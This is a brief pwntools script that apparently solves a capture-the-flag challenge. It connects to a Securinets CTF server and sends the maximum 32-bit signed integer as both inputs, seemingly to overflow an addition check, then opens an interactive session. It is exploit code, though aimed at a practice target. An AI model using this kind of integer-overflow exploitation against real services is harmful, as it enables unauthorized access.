from pwn import *

io = remote("pwn.friendly.securinets.tn", "5005")

ub_int = 2**31-1

io.sendlineafter(b'give me x : ', str(ub_int))
io.sendlineafter(b'give me y : ', str(ub_int))


io.interactive()